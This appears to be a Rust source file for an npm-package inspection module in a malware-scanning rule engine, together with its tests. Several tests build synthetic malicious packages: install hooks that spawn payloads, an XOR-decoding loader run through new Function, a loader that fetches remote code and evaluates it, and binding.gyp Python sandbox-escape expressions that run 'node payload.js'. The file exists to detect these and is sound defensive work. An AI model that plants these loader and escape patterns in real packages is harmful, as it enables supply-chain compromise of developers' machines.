fn looks_like_text(bytes: &[u8]) -> bool {
    if bytes.is_empty() {
        return true;
    }
    !bytes.contains(&0) && std::str::from_utf8(bytes).is_ok()
}

/// ASCII case-insensitive substring search without allocating a lowercased
/// copy of the haystack. Callers pass an already-lowercased needle; matching
/// is case-insensitive on both sides either way.
fn contains_case_insensitive(haystack: &str, needle: &str) -> bool {
    let needle = needle.as_bytes();
    let Some(&first) = needle.first() else {
        return true;
    };
    let haystack = haystack.as_bytes();
    if haystack.len() < needle.len() {
        return false;
    }
    let lower = first.to_ascii_lowercase();
    let upper = first.to_ascii_uppercase();
    let mut base = 0usize;
    let limit = haystack.len() - needle.len();
    while base <= limit {
        let Some(offset) = memchr::memchr2(lower, upper, &haystack[base..=limit]) else {
            return false;
        };
        let start = base + offset;
        if haystack[start..start + needle.len()].eq_ignore_ascii_case(needle) {
            return true;
        }
        base = start + 1;
    }
    false
}

fn find_script<'a>(npm: &'a Npm, stage: &str) -> Option<&'a Script> {
    npm.scripts
        .iter()
        .find(|script| script.name.as_deref() == Some(stage))
}

fn find_file<'a>(npm: &'a Npm, path: &str) -> Option<&'a NpmFile> {
    npm.files
        .iter()
        .find(|file| file.path.as_deref().is_some_and(|value| normalize_lookup(value) == path))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::tests::test_rule;
    use crate::tests::rule_false;
    use crate::tests::rule_true;
    use std::io::Write;

    use flate2::{Compression, write::GzEncoder};
    use tar::{Builder, Header};

    #[test]
    fn prefers_root_manifest_over_vendored_manifest() {
        let bytes = build_archive(&[
            (
                "package/package.json",
                r#"{"name":"root-pkg","version":"1.0.0","dependencies":{"ws":"^8.0.0"}}"#,
            ),
            (
                "package/node_modules/evil/package.json",
                r#"{"name":"evil-nested","version":"9.9.9"}"#,
            ),
        ]);

        let npm = main(&bytes, None).unwrap();
        assert_eq!(npm.name.as_deref(), Some("root-pkg"));
        assert!(npm
            .dependencies
            .iter()
            .any(|dependency| dependency.name.as_deref() == Some("ws")));
    }

    #[test]
    fn exposes_postinstall_target_content() {
        let bytes = build_archive(&[
            (
                "package/package.json",
                r#"{"name":"@shadanai/openclaw","version":"2026.3.31-3","scripts":{"postinstall":"node ./scripts/postinstall.mjs"}}"#,
            ),
            (
                "package/scripts/postinstall.mjs",
                "const FIXED_GATEWAY_TOKEN='x'; const FIXED_ZAI_API_KEY='y';",
            ),
        ]);

        let npm = main(&bytes, None).unwrap();
        let script = npm
            .scripts
            .iter()
            .find(|script| script.name.as_deref() == Some("postinstall"))
            .expect("postinstall script");
        assert_eq!(script.target_path.as_deref(), Some("scripts/postinstall.mjs"));
        assert!(script
            .content
            .as_deref()
            .is_some_and(|content| content.contains("FIXED_GATEWAY_TOKEN")));
    }

    #[test]
    fn exposes_local_payload_spawned_by_install_script_for_rule_matching() {
        let mut spawned_payload = "const padding = 'x';".repeat(180_000);
        spawned_payload.push_str(
            "client.rest.repos.createOrUpdateFileContents({message:'LongLiveTheResistanceAgainstMachines'});",
        );
        spawned_payload.push_str("const token='ghp_deadbeef'; const marker='__DAEMONIZED';");

        let bytes = build_archive(&[
            (
                "package/package.json",
                r#"{"name":"@bitwarden/cli","version":"2026.4.0","bin":{"bw":"bw_setup.js"},"scripts":{"preinstall":"node bw_setup.js"}}"#,
            ),
            (
                "package/bw_setup.js",
                r#"import { execFileSync } from "child_process"; execFileSync("./bun", ["bw1.js"], { stdio: "inherit" });"#,
            ),
            ("package/bw1.js", spawned_payload.as_str()),
        ]);

        rule_true!(
            r#"
            import "npm"
            rule test {
              condition:
                npm.is_npm and
                npm.has_install_script and
                npm.file_count("install_script") == 2 and
                npm.any_file_contains("install_script", "createOrUpdateFileContents") and
                npm.file_contains("bw1.js", "__DAEMONIZED")
            }
            "#,
            &bytes
        );
    }

    #[test]
    fn inventories_vendored_files_without_exposing_content() {
        let bytes = build_archive(&[
            (
                "package/package.json",
                r#"{"name":"pkg","version":"1.0.0","main":"index.js"}"#,
            ),
            ("package/index.js", "console.log('root');"),
            (
                "package/node_modules/dep/index.js",
                "console.log('vendored');",
            ),
        ]);

        let npm = main(&bytes, None).unwrap();
        let vendored = npm
            .files
            .iter()
            .find(|file| file.path.as_deref() == Some("node_modules/dep/index.js"))
            .expect("vendored file");
        assert_eq!(vendored.role.as_deref(), Some("vendored"));
        assert!(vendored.content.is_none());
        assert_eq!(npm.vendored_file_count, Some(1));
    }

    #[test]
    fn helper_functions_expose_root_package_semantics() {
        let bytes = build_archive(&[
            (
                "package/package.json",
                r#"{
                    "name":"pkg",
                    "version":"1.2.3",
                    "main":"index.js",
                    "bin":{"pkg":"bin/cli.js"},
                    "scripts":{"postinstall":"node ./scripts/postinstall.mjs"},
                    "dependencies":{"ws":"^8.0.0","koffi":"^2.0.0"}
                }"#,
            ),
            (
                "package/index.js",
                "const marker='discord_desktop_core'; console.log(marker);",
            ),
            (
                "package/bin/cli.js",
                "#!/usr/bin/env node\nconsole.log('discord_desktop_core');",
            ),
            (
                "package/scripts/postinstall.mjs",
                "const FIXED_GATEWAY_TOKEN='x'; const tool='mkcert';",
            ),
        ]);

        rule_true!(
            r#"
            import "npm"
            rule test {
              condition:
                npm.is_npm and
                npm.name == "pkg" and
                npm.version == "1.2.3" and
                npm.depends_on("ws") and
                npm.depends_on("koffi", "dependencies") and
                npm.has_script("postinstall") and
                npm.script_contains("postinstall", "fixed_gateway_token") and
                npm.has_bin_named("pkg") and
                npm.bin_contains("pkg", "discord_desktop_core") and
                npm.main_contains("discord_desktop_core") and
                npm.has_file("scripts/postinstall.mjs") and
                npm.file_contains("scripts/postinstall.mjs", "mkcert") and
                npm.any_file_contains("entrypoint", "discord_desktop_core") and
                npm.file_count("entrypoint") == 2 and
                npm.file_count("install_script") == 1
            }
            "#,
            &bytes
        );
    }

    #[test]
    fn helper_functions_do_not_expose_vendored_content() {
        let bytes = build_archive(&[
            (
                "package/package.json",
                r#"{"name":"pkg","version":"1.0.0","main":"index.js"}"#,
            ),
            ("package/index.js", "console.log('root');"),
            (
                "package/node_modules/dep/index.js",
                "console.log('vendored-secret');",
            ),
        ]);

        rule_true!(
            r#"
            import "npm"
            rule test {
              condition:
                npm.has_file("node_modules/dep/index.js") and
                npm.file_count("vendored") == 1 and
                not npm.file_contains("node_modules/dep/index.js", "vendored-secret")
            }
            "#,
            &bytes
        );

        rule_false!(
            r#"
            import "npm"
            rule test {
              condition:
                npm.any_file_contains("vendored", "vendored-secret")
            }
            "#,
            &bytes
        );
    }

    #[test]
    fn metadata_gate_disables_npm_module_for_non_npm_artifacts() {
        let bytes = build_archive(&[(
            "package/package.json",
            r#"{"name":"pkg","version":"1.0.0","scripts":{"postinstall":"node ./scripts/postinstall.mjs"}}"#,
        )]);

        let npm = main(&bytes, Some(b"crate")).unwrap();
        assert_eq!(npm.is_npm, Some(false));
        assert_eq!(npm.has_manifest, Some(false));
        assert!(npm.files.is_empty());
    }

    #[test]
    fn prepack_target_is_not_classified_as_install_script() {
        let bytes = build_archive(&[
            (
                "package/package.json",
                r#"{
                    "name":"pkg",
                    "version":"1.0.0",
                    "scripts":{"prepack":"node ./bin/cli.js"},
                    "bin":{"pkg":"bin/cli.js"}
                }"#,
            ),
            ("package/bin/cli.js", "console.log('cli');"),
        ]);

        rule_true!(
            r#"
            import "npm"
            rule test {
              condition:
                npm.is_npm and
                not npm.has_install_script and
                npm.file_count("install_script") == 0 and
                npm.file_count("entrypoint") == 1
            }
            "#,
            &bytes
        );
    }

    #[test]
    fn exposes_large_root_entrypoint_content_for_rule_matching() {
        let mut large_loader = "const _k='secret';const _d=Buffer.from('ZmFrZQ==','base64');"
            .repeat(8_000);
        large_loader.push_str("for(let _i=0;_i<_d.length;_i++)_r[_i]=_d[_i]^_k.charCodeAt(_i%_k.length);new Function(\"require\",\"module\",\"exports\",\"__filename\",\"__dirname\",_r.toString(\"utf-8\"))(require,module,exports,__filename,__dirname);");
        assert!(large_loader.len() > 256 * 1024);

        let bytes = build_archive(&[
            (
                "package/package.json",
                r#"{"name":"large-loader","version":"1.0.0","main":"index.js"}"#,
            ),
            ("package/index.js", large_loader.as_str()),
        ]);

        rule_true!(
            r#"
            import "npm"
            rule test {
              condition:
                npm.main_contains("Buffer.from(") and
                npm.main_contains("new Function(\"require\",\"module\",\"exports\",\"__filename\",\"__dirname\"")
            }
            "#,
            &bytes
        );
    }

    #[test]
    fn exposes_local_modules_imported_by_main_for_rule_matching() {
        let bytes = build_archive(&[
            (
                "package/package.json",
                r#"{"name":"runtime-loader","version":"1.0.0","main":"lib/index.js"}"#,
            ),
            (
                "package/lib/index.js",
                "module.exports = require('./prismalogger');",
            ),
            (
                "package/lib/prismalogger.js",
                "const axios = require('axios'); const src = atob('aHR0cHM6Ly9leGFtcGxlLmNvbS9sb2FkZXI='); const s = axios.get(src).data.logger; const handler = new Function.constructor('require', s); handler(require);",
            ),
        ]);

        rule_true!(
            r#"
            import "npm"
            rule test {
              condition:
                npm.any_file_contains("entrypoint", "axios.get(") and
                npm.any_file_contains("entrypoint", "new Function.constructor(") and
                npm.file_contains("lib/prismalogger.js", "handler(require)")
            }
            "#,
            &bytes
        );
    }

    #[test]
    fn does_not_expose_large_non_selected_source_content() {
        let large_source = "console.log('not selected');".repeat(100_000);
        assert!(large_source.len() > MAX_SCRIPTS_DIR_TEXT_BYTES);

        let bytes = build_archive(&[
            (
                "package/package.json",
                r#"{"name":"large-source","version":"1.0.0","main":"index.js"}"#,
            ),
            ("package/index.js", "console.log('main');"),
            ("package/src/payload.js", large_source.as_str()),
        ]);

        rule_false!(
            r#"
            import "npm"
            rule test {
              condition:
                npm.file_contains("src/payload.js", "not selected")
            }
            "#,
            &bytes
        );
    }

    #[test]
    fn exposes_binding_gyp_build_config_for_rule_matching() {
        let bytes = build_archive(&[
            (
                "package/package.json",
                r#"{"name":"native-addon","version":"1.0.0","main":"index.js","gypfile":true}"#,
            ),
            (
                "package/binding.gyp",
                r#"{
                    "targets": [
                        {
                            "target_name": "addon",
                            "sources": ["src/addon.cc"],
                            "conditions": [
                                ["OS=='win'", {"libraries": ["ws2_32.lib"]}]
                            ]
                        }
                    ]
                }"#,
            ),
        ]);

        rule_true!(
            r#"
            import "npm"
            rule test {
              condition:
                npm.is_npm and
                npm.has_native_gyp and
                npm.file_count("build_config") == 1 and
                npm.any_file_contains("build_config", "target_name") and
                npm.file_contains("binding.gyp", "ws2_32.lib")
            }
            "#,
            &bytes
        );
    }

    #[test]
    fn binding_gyp_sandbox_escape_primitives_are_queryable() {
        // Synthetic reproduction of the Trinitite binding.gyp shape: a
        // Python sandbox-escape expression in `conditions` launching node.
        let bytes = build_archive(&[
            (
                "package/package.json",
                r#"{"name":"codegen-helper","version":"1.2.3","gypfile":true}"#,
            ),
            (
                "package/binding.gyp",
                r#"{
                    "targets": [{"target_name": "binding", "sources": ["build/binding.cc"]}],
                    "conditions": [
                        ["(lambda: [w for w in ().__class__.__base__.__subclasses__() if w.__name__=='catch_warnings'][0]()._module.__builtins__['eval']('node ./build/Release/payload.js'))()=='1'", {"cflags": ["-O3"]}]
                    ]
                }"#,
            ),
        ]);

        rule_true!(
            r#"
            import "npm"
            rule test {
              condition:
                npm.has_native_gyp and
                npm.file_count("build_config") == 1 and
                npm.any_file_contains("build_config", "__subclasses__") and
                npm.any_file_contains("build_config", "catch_warnings") and
                npm.any_file_contains("build_config", "__builtins__") and
                npm.any_file_contains("build_config", "node ./build/Release/payload.js")
            }
            "#,
            &bytes
        );

        rule_false!(
            r#"
            import "npm"
            rule test {
              condition:
                npm.any_file_contains("build_config", "__subclasses__") or
                npm.any_file_contains("build_config", "__globals__") or
                npm.any_file_contains("build_config", "__import__")
            }
            "#,
            &build_archive(&[
                (
                    "package/package.json",
                    r#"{"name":"native-benign","version":"1.0.0","gypfile":true}"#,
                ),
                (
                    "package/binding.gyp",
                    r#"{
                        "targets": [{"target_name": "addon", "sources": ["src/addon.cc"]}],
                        "conditions": [["OS=='win'", {"libraries": ["ws2_32.lib"]}], ["OS=='mac'", {"xcode_settings": {"OTHER_CFLAGS": ["-std=c++17"]}}]]
                    }"#,
                ),
            ])
        );
    }

    #[test]
    fn binding_gyp_unicode_escaped_identifiers_are_queryable() {
        // Attackers hide dunder names from literal-token rules by escaping
        // the underscores; the raw escape bytes must remain searchable.
        let bytes = build_archive(&[
            (
                "package/package.json",
                r#"{"name":"native-x","version":"1.0.0","gypfile":true}"#,
            ),
            (
                "package/binding.gyp",
                r#"{"targets": [{"target_name": "b"}], "conditions": [["eval('\u005f\u005fimport\u005f\u005f(\'os\').system('node p.js')", {}]]}"#,
            ),
        ]);

        rule_true!(
            r#"
            import "npm"
            rule test {
              condition:
                npm.has_native_gyp and
                npm.file_count("build_config") == 1 and
                npm.any_file_contains("build_config", "\\u005f") and
                npm.any_file_contains("build_config", "node p.js") and
                not npm.any_file_contains("build_config", "__import__")
            }
            "#,
            &bytes
        );
    }

    #[test]
    fn vendored_binding_gyp_is_not_exposed_as_build_config() {
        let bytes = build_archive(&[
            (
                "package/package.json",
                r#"{"name":"pkg","version":"1.0.0","main":"index.js"}"#,
            ),
            ("package/index.js", "console.log('root');"),
            (
                "package/node_modules/dep/binding.gyp",
                "{\"targets\":[{\"target_name\":\"vendored\",\"conditions\":[\"().__class__.__base__.__subclasses__()\"]}]}",
            ),
        ]);

        rule_false!(
            r#"
            import "npm"
            rule test {
              condition:
                npm.has_native_gyp or
                npm.file_count("build_config") > 0 or
                npm.any_file_contains("vendored", "__subclasses__")
            }
            "#,
            &bytes
        );
    }

    fn build_archive(files: &[(&str, &str)]) -> Vec<u8> {
        let mut tar_data = Vec::new();
        {
            let mut builder = Builder::new(&mut tar_data);
            for (path, content) in files {
                let bytes = content.as_bytes();
                let mut header = Header::new_gnu();
                header.set_entry_type(tar::EntryType::Regular);
                header.set_mode(0o644);
                header.set_size(bytes.len() as u64);
                header.set_cksum();
                builder
                    .append_data(&mut header, *path, Cursor::new(bytes))
                    .expect("append file to archive");
            }
            builder.finish().expect("finish tar archive");
        }

        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
        encoder.write_all(&tar_data).expect("write tar data");
        encoder.finish().expect("finish gzip archive")
    }
}
